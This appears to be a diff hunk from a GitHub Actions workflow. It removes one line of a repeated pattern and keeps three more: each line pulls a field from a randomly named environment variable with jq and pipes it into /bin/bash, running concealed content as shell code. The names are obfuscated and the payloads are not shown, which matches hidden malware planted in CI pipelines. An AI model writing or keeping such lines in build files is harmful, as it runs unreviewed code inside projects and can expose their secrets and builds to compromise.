@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$kmi0888" | jq -r .nmrmd6 | /bin/bash
           echo $zdcxr28284 | jq -r .z900 | /bin/bash
           echo $qh6948 | jq -r .ek0 | /bin/bash
-          echo $zk581 | jq -r .yxj7 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
